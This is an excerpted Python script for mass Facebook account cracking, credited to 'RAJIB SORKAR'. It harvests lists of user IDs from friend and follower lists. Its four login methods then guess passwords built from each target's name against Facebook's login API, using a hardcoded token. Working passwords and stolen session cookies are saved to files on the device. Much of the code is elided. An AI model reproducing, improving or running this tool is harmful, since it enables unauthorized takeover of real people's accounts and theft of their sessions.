...
\033[1;37m   ╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝╚═════╝░
\033[1;37m------------------------------------------------
\033[1;37m Owner   :           RAJIB SORKAR
\033[1;37m Facebook:        RAJIB SORKAR
\033[1;37m Github  :            MR--RAJIB--VAI
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back RAJIB Menu ")
        exit()
...
def sarfraz():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://www.facebook.com/share/18WDdYETJK/')
        pass
    elif select =='F':
        os.system('xdg-open https://www.facebook.com/share/18WDdYETJK/')
    else:
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {M}[RAJIB] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [RAJIB-OK] {sid} | {ps} {M}")
                    oks.append(sid)
                    open('/sdcard/RAJIB_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{M} [RAJIB-CP] {sid} | {ps} {M}")
                     cps.append(sid)
                     open('/sdcard/RAJIB_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {M}[RAJIB] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {M}{'{:.0%}'.format(loop/float(len(self.id)))}{M}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                    print(f"\r{M} [RAJIB-OK] {sid} | {ps} {M}")
                    oks.append(sid)
                    open('/sdcard/RAJIB_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{M} [RAJIB-CP] {sid} | {ps} {M}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {M}[RAJIB] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {M}[RAJIB] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{M} [RAJIB-OK] {sid} | {ps} {M}")
                    oks.append(sid)
                    open('/sdcard/RAJIB_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            print(f'{M} Total IDs : %s ' % len(self.id))
            print(f'{M} Cracking Started...')
            print(47*"-")
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{M}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/RAJIB99.txt') 
        print(47*"-")
        ...
        for fbuid in fbidz:
            ...
            try:
                ...
                sys.stdout.write(f"\r\r{S}Collection IDs = [{fx}]{M}");sys.stdout.flush()
            except KeyError:
                pass
        apnd.close()
        print('')
...
def follower():
    ...
    try:
        ...
        try:
            ...
            print(f"{M}ID Not Public");time.sleep(1)
            menu()
...
def cutter():
    ...
    print(47*'-')
    input(f"{S} Press Enter To Back RAJIB Menu ")
    RAJIB(allkey)       
